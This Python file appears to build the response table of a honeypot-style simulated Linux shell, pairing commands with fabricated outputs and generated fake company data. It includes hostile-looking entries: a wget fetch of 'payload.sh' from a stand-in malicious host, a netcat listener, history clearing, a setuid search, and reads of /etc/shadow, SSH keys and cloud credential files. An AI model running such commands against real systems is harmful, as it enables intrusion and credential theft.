knowledge_documents = [

    {
        "command": "ps",
        "description": "Displays running processes in Linux.",
        "example_output": """
USER       PID %CPU %MEM COMMAND
root         1  0.0  0.1 /sbin/init
root       221  0.0  0.2 sshd
mysql      334  0.4  1.3 mysqld
www-data   510  0.1  0.3 nginx
"""
    },

    {
        "command": "netstat",
        "description": "Shows active network connections.",
        "example_output": """
Proto Local Address      State
tcp   0.0.0.0:22         LISTEN
tcp   0.0.0.0:80         LISTEN
tcp   127.0.0.1:3306     LISTEN
"""
    },

    {
        "command": "netstat -antp",
        "description": "Show active TCP connections with PID and program name.",
        "example_output": """Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      221/sshd            
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      510/nginx: master   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      334/mysqld          
tcp        0      0 192.168.1.3:22          192.168.1.10:54321      ESTABLISHED 221/sshd            """
    },

    {
        "command": "ls",
        "description": "Lists files in a directory.",
        "example_output": """
home
var
etc
tmp
"""
    },

    {
        "command": "whoami",
        "description": "Displays the current user.",
        "example_output": "ubuntu"
    },

    {
        "command": "uname",
        "description": "Displays system information.",
        "example_output": "Linux web-prod-01 5.15.0-generic x86_64 GNU/Linux"
    },

    {
        "command": "nmap",
        "description": "Network exploration tool and port scanner.",
        "example_output": """
Starting Nmap 7.80 ( https://nmap.org ) at 2026-06-10 15:20 UTC
Nmap scan report for target (192.168.1.1)
Host is up (0.002s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
"""
    },

    {
        "command": "top",
        "description": "Display Linux processes.",
        "example_output": """
top - 15:21:05 up 2 days, 18 min,  1 user,  load average: 0.00, 0.01, 0.05
Tasks: 104 total,   1 running, 103 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.3 us,  0.1 sy,  0.0 ni, 99.6 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
MiB Mem :   1984.3 total,   1245.1 free,    312.4 used,    426.8 buff/cache
MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   1512.2 avail Mem 

  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
    1 root      20   0  168340  11824   8292 S   0.0   0.6   0:02.11 systemd
  221 root      20   0   15820   8204   7210 S   0.0   0.4   0:00.45 sshd
  334 mysql     20   0 1832048 245210  32104 S   0.0  12.1   4:12.33 mysqld
  510 www-data  20   0   56214   8410   6124 S   0.0   0.4   0:01.05 nginx
 1120 ubuntu    20   0   22452   4120   3210 S   0.0   0.2   0:00.15 bash
"""
    },

    {
        "command": "ip",
        "description": "Displays IP addresses and network interfaces.",
        "example_output": """1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:8c:12:a4 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.3/24 brd 192.168.1.255 scope global dynamic eth0
       valid_lft 86120sec preferred_lft 86120sec
    inet6 fe80::a00:27ff:fe8c:12a4/64 scope link 
       valid_lft forever preferred_lft forever"""
    },

    {
        "command": "ifconfig",
        "description": "Configures or displays network interface parameters.",
        "example_output": """eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.3  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::a00:27ff:fe8c:12a4  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:8c:12:a4  txqueuelen 1000  (Ethernet)
        RX packets 1432  bytes 128450 (128.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 980  bytes 84320 (84.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 12  bytes 960 (960.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 12  bytes 960 (960.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0"""
    },

    {
        "command": "id",
        "description": "Displays real and effective user and group IDs.",
        "example_output": "uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),27(sudo),110(lxd)"
    },

    {
        "command": "ss",
        "description": "Utility to investigate sockets.",
        "example_output": """Netid State  Recv-Q Send-Q         Local Address:Port          Peer Address:Port Process
tcp   LISTEN 0      128                  0.0.0.0:22                 0.0.0.0:*
tcp   LISTEN 0      70                 127.0.0.1:3306               0.0.0.0:*
tcp   LISTEN 0      512                  0.0.0.0:80                 0.0.0.0:*"""
    },

    {
        "command": "df",
        "description": "Displays disk space usage.",
        "example_output": """Filesystem     1K-blocks    Used Available Use% Mounted on
udev              973244       0    973244   0% /dev
tmpfs             198432    1240    197192   1% /run
/dev/sda1       25312384 4567120  19745264  19% /
tmpfs             992160       0    992160   0% /dev/shm
tmpfs               5120       4      5116   1% /run/lock
/dev/sda15        104832    5324     99508   6% /boot/efi"""
    },

    {
        "command": "free",
        "description": "Displays total, used, and free memory.",
        "example_output": """              total        used        free      shared  buff/cache   available
Mem:        2032048      319840     1274932        1240      437276     1548480
Swap:       2097148           0     2097148"""
    },

    {
        "command": "curl",
        "description": "Command line tool for transferring data with URLs.",
        "example_output": """  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2048  100  2048    0     0  12432      0 --:--:-- --:--:-- --:--:-- 12564"""
    },

    {
        "command": "wget",
        "description": "Non-interactive network downloader.",
        "example_output": """--2026-06-15 14:55:02--  http://malware.sh/payload.sh
Resolving malware.sh (malware.sh)... 192.168.1.10
Connecting to malware.sh (malware.sh)|192.168.1.10|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2048 (2.0K) [application/x-sh]
Saving to: 'payload.sh'

payload.sh          100%[===================>]   2.00K  --.-KB/s    in 0.002s  

2026-06-15 14:55:02 (980 KB/s) - 'payload.sh' saved [2048/2048]"""
    },

    {
        "command": "chmod",
        "description": "Changes file mode bits.",
        "example_output": ""
    },

    {
        "command": "mkdir",
        "description": "Create directories.",
        "example_output": ""
    },

    {
        "command": "ping",
        "description": "Sends ICMP ECHO_REQUEST to network hosts.",
        "example_output": """PING google.com (142.250.190.46) 56(84) bytes of data.
64 bytes from 142.250.190.46: icmp_seq=1 ttl=116 time=12.4 ms
64 bytes from 142.250.190.46: icmp_seq=2 ttl=116 time=11.8 ms
64 bytes from 142.250.190.46: icmp_seq=3 ttl=116 time=12.1 ms
--- google.com ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 11.821/12.115/12.432/0.252 ms"""
    },

    {
        "command": "uptime",
        "description": "Tells how long the system has been running.",
        "example_output": " 14:56:02 up 2 days, 18 min,  1 user,  load average: 0.02, 0.05, 0.05"
    },

    {
        "command": "systemctl",
        "description": "Control the systemd system and service manager.",
        "example_output": """  UNIT                         LOAD   ACTIVE SUB     DESCRIPTION
  sys-devices-virtual-net-eth0.device loaded active plugged /sys/devices/virtual/net/eth0
  cron.service                 loaded active running Regular background program processing daemon
  dbus.service                 loaded active running D-Bus System Message Bus
  mysql.service                loaded active running MySQL Community Server
  nginx.service                loaded active running A high performance web server and a reverse proxy server
  ssh.service                  loaded active running OpenBSD Secure Shell server"""
    },

    {
        "command": "env",
        "description": "Run a program in a modified environment or print environment.",
        "example_output": """SHELL=/bin/bash
USER=ubuntu
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/home/ubuntu
LANG=en_US.UTF-8
HOME=/home/ubuntu
LOGNAME=ubuntu"""
    },

    {
        "command": "lscpu",
        "description": "Displays information about the CPU architecture.",
        "example_output": """Architecture:            x86_64
  CPU op-mode(s):        32-bit, 64-bit
  Address sizes:         39 bits physical, 48 bits virtual
  Byte Order:            Little Endian
CPU(s):                  2
  On-line CPU(s) list:   0,1
Vendor ID:               GenuineIntel
  Model name:            Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz
  CPU family:            6
  Model:                 122
  Thread(s) per core:    1
  Core(s) per socket:    2
  Socket(s):             1"""
    },

    {
        "command": "history",
        "description": "Displays the command history list with line numbers.",
        "example_output": """    1  whoami
    2  uname -a
    3  ls -la
    4  cat /etc/passwd
    5  netstat -antp
    6  ps aux
    7  history"""
    },

    {
        "command": "history -c",
        "description": "Clears the command history list.",
        "example_output": ""
    },

    {
        "command": "nc",
        "description": "Arbitrary data transmission and listening utility.",
        "example_output": ""
    },

    {
        "command": "nc -lvp 4444",
        "description": "Start netcat listening on port 4444.",
        "example_output": "Listening on 0.0.0.0 4444"
    },

    {
        "command": "sudo",
        "description": "Execute a command as another user, typically root.",
        "example_output": """Matching Defaults entries for ubuntu on web-prod-01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User ubuntu may run the following commands on web-prod-01:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL"""
    },

    {
        "command": "find",
        "description": "Search for files in a directory hierarchy.",
        "example_output": """/home/ubuntu/notes.txt
/home/ubuntu/script.sh
/home/ubuntu/.bashrc
/home/ubuntu/.profile"""
    },

    {
        "command": "find / -perm -4000 -type f 2>/dev/null",
        "description": "Find files with setuid permission set.",
        "example_output": """/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign"""
    },

    {
        "command": "grep",
        "description": "Print lines matching a pattern.",
        "example_output": "ubuntu:x:1000:1000::/home/ubuntu:/bin/bash"
    },

    {
        "command": "w",
        "description": "Show who is logged on and what they are doing.",
        "example_output": """ 14:58:12 up 2 days, 20 min,  1 user,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ubuntu   pts/0    192.168.1.10     14:48    0.00s  0.11s  0.02s w"""
    },

    {
        "command": "last",
        "description": "Show a listing of last logged in users.",
        "example_output": """ubuntu   pts/0        192.168.1.10     Mon Jun 15 14:48   still logged in
ubuntu   pts/0        192.168.1.10     Sun Jun 14 09:15 - 11:22  (02:07)
reboot   system boot  5.15.0-91-generi Sat Jun 13 14:38   still running

wtmp begins Sat Jun 13 14:38:12 2026"""
    },

    {
        "command": "crontab",
        "description": "Maintain crontab files for individual users.",
        "example_output": """# m h  dom mon dow   command
*/5 * * * * /home/ubuntu/script.sh >/dev/null 2>&1"""
    },

    {
        "command": "crontab -l",
        "description": "Lists the current crontab entries.",
        "example_output": """# m h  dom mon dow   command
*/5 * * * * /home/ubuntu/script.sh >/dev/null 2>&1"""
    },

    {
        "command": "crontab -e",
        "description": "Opens the crontab editor (displays terminal editor choice on first launch).",
        "example_output": """no crontab for ubuntu - using an empty one

Select an editor.  To change later, run 'select-editor'.
  1. /bin/nano        <---- easiest
  2. /usr/bin/vim.basic
  3. /usr/bin/vim.tiny
  4. /bin/ed

Choose 1-4 [1]:"""
    },

    {
        "command": "iptables",
        "description": "Administration tool for IPv4 packet filtering and NAT.",
        "example_output": """Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination"""
    },

    {
        "command": "hostname",
        "description": "Show or set the system's host name.",
        "example_output": "web-prod-01"
    },

    {
        "command": "dmesg",
        "description": "Print or control the kernel ring buffer.",
        "example_output": """[    0.000000] Linux version 5.15.0-91-generic (buildd@lcy02-amd64-043)
[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.15.0-91-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro
[    0.051234] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    1.431205] EXT4-fs (dm-0): mounted filesystem with ordered data mode. Opts: (null). Quota mode: none.
[    2.980120] systemd[1]: Inserted module 'autofs4'
[    5.120482] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input3"""
    },

    {
        "command": "lsb_release",
        "description": "Print distribution-specific information.",
        "example_output": """Distributor ID: Ubuntu
Description:    Ubuntu 22.04.4 LTS
Release:        22.04
Codename:       jammy"""
    },

    {
        "command": "which",
        "description": "Locate a command.",
        "example_output": "/usr/bin/python3"
    },

    {
        "command": "docker",
        "description": "Docker image and container command line interface.",
        "example_output": """CONTAINER ID   IMAGE          COMMAND                  CREATED         STATUS         PORTS                  NAMES
a12b3c4d5e6f   mysql:8.0      "docker-entrypoint.s…"   2 days ago      Up 2 days      3306/tcp, 33060/tcp    mysql-db
b987c654321a   nginx:alpine   "/docker-entrypoint.…"   2 days ago      Up 2 days      0.0.0.0:80->80/tcp     web-server"""
    },

    {
        "command": "netcat",
        "description": "Arbitrary data transmission and listening utility.",
        "example_output": ""
    }

]

# Dynamically append generated employee, ecosystem, and document entries to knowledge_documents
try:
    import os
    from data_generator import get_generated_all
    gen_data = get_generated_all()
    
    # Monday - Employees, Departments, Projects
    knowledge_documents.append({
        "command": "cat /home/ubuntu/company_directory/employees.csv",
        "description": "Displays the employee registry containing details like EmployeeID, Name, Email, Department, Role, Phone, Assigned Projects, and Access Levels.",
        "example_output": gen_data["employees_csv"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/company_directory/projects.csv",
        "description": "Lists the active company projects, lead roles, descriptions, clients, and current status.",
        "example_output": gen_data["projects_csv"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/company_directory/departments.json",
        "description": "Detailed JSON file listing all department codes, department names, managers, budgets, and physical locations.",
        "example_output": gen_data["departments_json"]
    })
    
    # Tuesday - Clients, Vendors, Infrastructure Assets
    knowledge_documents.append({
        "command": "cat /var/www/internal/clients.json",
        "description": "Lists client companies, industry domains, key contacts, assigned projects, contract values, and status.",
        "example_output": gen_data["clients_json"]
    })
    knowledge_documents.append({
        "command": "cat /var/www/internal/vendors.json",
        "description": "Provides the list of contract vendors, services provided, account managers, and status.",
        "example_output": gen_data["vendors_json"]
    })
    knowledge_documents.append({
        "command": "cat /var/www/internal/infrastructure_assets.yaml",
        "description": "Configuration YAML file listing hostname, IP, OS, environment, role, open ports, and patch status of all infrastructure assets.",
        "example_output": gen_data["infrastructure_yaml"]
    })
    
    #Dynamic Documents
    doc_paths = {
        "report_q1_security.md": "/home/ubuntu/documents/internal_reports/report_q1_security.md",
        "report_cloud_migration.md": "/home/ubuntu/documents/internal_reports/report_cloud_migration.md",
        "meeting_notes_2026_06_22.md": "/home/ubuntu/documents/meeting_notes/meeting_notes_2026_06_22.md",
        "meeting_notes_2026_06_15.md": "/home/ubuntu/documents/meeting_notes/meeting_notes_2026_06_15.md",
        "vpn_access_guidelines.md": "/home/ubuntu/documents/technical_docs/vpn_access_guidelines.md",
        "api_gateway_setup.md": "/home/ubuntu/documents/technical_docs/api_gateway_setup.md",
        "incident_2026_05_12_ddos.md": "/home/ubuntu/documents/incident_reports/incident_2026_05_12_ddos.md",
        "incident_2026_06_01_phishing.md": "/home/ubuntu/documents/incident_reports/incident_2026_06_01_phishing.md",
        "remote_work_policy.md": "/home/ubuntu/documents/policies/remote_work_policy.md",
        "incident_response_policy.md": "/home/ubuntu/documents/policies/incident_response_policy.md",
        "password_policy.md": "/home/ubuntu/documents/policies/password_policy.md",
        "database_recovery_manual.md": "/home/ubuntu/documents/technical_docs/database_recovery_manual.md",
        "kubernetes_deployment_guide.md": "/home/ubuntu/documents/technical_docs/kubernetes_deployment_guide.md",
        "incident_2026_06_18_malware.md": "/home/ubuntu/documents/incident_reports/incident_2026_06_18_malware.md",
        "incident_2026_06_24_leak.md": "/home/ubuntu/documents/incident_reports/incident_2026_06_24_leak.md",
        "employee_onboarding_guide.md": "/home/ubuntu/documents/hr/employee_onboarding_guide.md",
        "performance_review_template.md": "/home/ubuntu/documents/hr/performance_review_template.md",
        "cloudscale_solutions_sla.md": "/home/ubuntu/documents/contracts/cloudscale_solutions_sla.md",
        "netguard_security_agreement.md": "/home/ubuntu/documents/contracts/netguard_security_agreement.md",
        "network_topology_guide.md": "/home/ubuntu/documents/network/network_topology_guide.md",
        "subnets_routing_map.md": "/home/ubuntu/documents/network/subnets_routing_map.md"
    }
    
    for key, path in doc_paths.items():
        if key in gen_data["documents"]:
            knowledge_documents.append({
                "command": f"cat {path}",
                "description": f"Displays the content of internal document {os.path.basename(path)}.",
                "example_output": gen_data["documents"][key]
            })

    # New additions for Fake Credentials, API keys, DB Records, Configuration Files
    knowledge_documents.append({
        "command": "cat /home/ubuntu/.ssh/id_rsa",
        "description": "Displays the SSH private key of the ubuntu user.",
        "example_output": gen_data["ssh_private_key"]
    })
    knowledge_documents.append({
        "command": "cat /etc/shadow",
        "description": "Displays the shadow file containing user password hashes.",
        "example_output": gen_data["shadow_file"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/.aws/credentials",
        "description": "Displays the AWS credentials containing API key access keys.",
        "example_output": gen_data["aws_credentials"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/.slack/config.json",
        "description": "Displays the configuration file with Slack webhook API integration keys.",
        "example_output": gen_data["slack_config_json"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/.env",
        "description": "Displays the environment file containing API keys and database credentials.",
        "example_output": gen_data["env_file"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/company_directory/audit_log.csv",
        "description": "Displays the database logins and actions audit log.",
        "example_output": gen_data["audit_log_csv"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/documents/technical_docs/stripe_config.json",
        "description": "Displays the Stripe secret API key configuration.",
        "example_output": gen_data["stripe_config_json"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/documents/technical_docs/k8s_deployment.yaml",
        "description": "Displays the Kubernetes deployment configuration containing database URL credentials.",
        "example_output": gen_data["kubernetes_yaml"]
    })
    knowledge_documents.append({
        "command": "cat /var/www/internal/db_backup.sql",
        "description": "Displays database dump containing schema and mock records.",
        "example_output": gen_data["db_backup_sql"]
    })
    knowledge_documents.append({
        "command": "cat /etc/nginx/sites-available/default",
        "description": "Displays Nginx server configuration.",
        "example_output": gen_data["nginx_conf"]
    })
    knowledge_documents.append({
        "command": "cat /var/www/internal/dev_tasks.md",
        "description": "Displays the cloud migration dev tasks and server deployment instructions.",
        "example_output": gen_data["dev_tasks_md"]
    })
    knowledge_documents.append({
        "command": "cat /etc/gateway/router.conf",
        "description": "Displays the API Gateway Router configuration detailing downstream mappings.",
        "example_output": gen_data["gateway_router_conf"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/.ssh/backup_key",
        "description": "Displays the backup node SSH private key.",
        "example_output": gen_data["backup_key"]
    })
    knowledge_documents.append({
        "command": "cat /home/dev/backup_status.txt",
        "description": "Displays the backup node system backup status and S3 encryption passphrase.",
        "example_output": gen_data["backup_status_txt"]
    })

    # New config files
    knowledge_documents.append({
        "command": "cat /etc/ssh/sshd_config",
        "description": "Displays the SSH server daemon configuration file.",
        "example_output": gen_data["sshd_config"]
    })
    knowledge_documents.append({
        "command": "cat /etc/redis/redis.conf",
        "description": "Displays the Redis server configuration file.",
        "example_output": gen_data["redis_config"]
    })
    knowledge_documents.append({
        "command": "cat /etc/postgresql/14/main/postgresql.conf",
        "description": "Displays the PostgreSQL server configuration file.",
        "example_output": gen_data["postgresql_config"]
    })

    # Emails
    knowledge_documents.append({
        "command": "cat /home/ubuntu/emails/inbox_summary.txt",
        "description": "Displays the summary directory listing of corporate emails.",
        "example_output": gen_data["emails"]["inbox_summary.txt"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/emails/security_phishing_alert.txt",
        "description": "Displays the phishing security alert email from the CISO.",
        "example_output": gen_data["emails"]["security_phishing_alert.txt"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/emails/staging_db_access.txt",
        "description": "Displays the staging database access credentials email from the Operations Director.",
        "example_output": gen_data["emails"]["staging_db_access.txt"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/emails/performance_review_cycle.txt",
        "description": "Displays the performance review cycle email from the HR Manager.",
        "example_output": gen_data["emails"]["performance_review_cycle.txt"]
    })
    knowledge_documents.append({
        "command": "cat /home/ubuntu/emails/vendor_contract_renewal.txt",
        "description": "Displays the vendor hosting contract review email from the CFO.",
        "example_output": gen_data["emails"]["vendor_contract_renewal.txt"]
    })

    # New additions for missing filesystem files
    knowledge_documents.append({
        "command": "cat /home/ubuntu/notes.txt",
        "description": "Displays the notes file with instructions about system updates and tasks.",
        "example_output": "Remember to update the server.\\nCheck the internal admin scripts under /var/www/internal/dev_tasks.md for migration tasks and access credentials.\\n"
    })
    
    knowledge_documents.append({
        "command": "cat /home/ubuntu/script.sh",
        "description": "Displays the shell script content.",
        "example_output": "#!/bin/bash\\necho Hello World\\n"
    })
    
    knowledge_documents.append({
        "command": "cat /home/ubuntu/.aws/config",
        "description": "Displays the AWS config detailing region and output formatting.",
        "example_output": gen_data.get("aws_config", "")
    })
    
    knowledge_documents.append({
        "command": "cat /home/ubuntu/.kube/config",
        "description": "Displays the Kubernetes kubeconfig file.",
        "example_output": gen_data.get("kube_config", "")
    })
    
    knowledge_documents.append({
        "command": "cat /home/ubuntu/.pgpass",
        "description": "Displays the PostgreSQL password file.",
        "example_output": gen_data.get("pgpass_file", "")
    })
    
    knowledge_documents.append({
        "command": "cat /etc/netplan/01-netcfg.yaml",
        "description": "Displays the Netplan network configuration file.",
        "example_output": gen_data.get("netplan_config", "")
    })
    
    knowledge_documents.append({
        "command": "cat /etc/hosts",
        "description": "Displays the IP address mappings to hostnames configuration file.",
        "example_output": gen_data.get("hosts_file", "") or """127.0.0.1 localhost
127.0.1.1 web-prod-01
10.200.100.15 prod-db-01.xynera.local prod-db-01
10.200.100.40 backup-node-02
"""
    })
except Exception as e:
    import sys
    print(f"Error loading dynamic knowledge documents: {e}", file=sys.stderr)
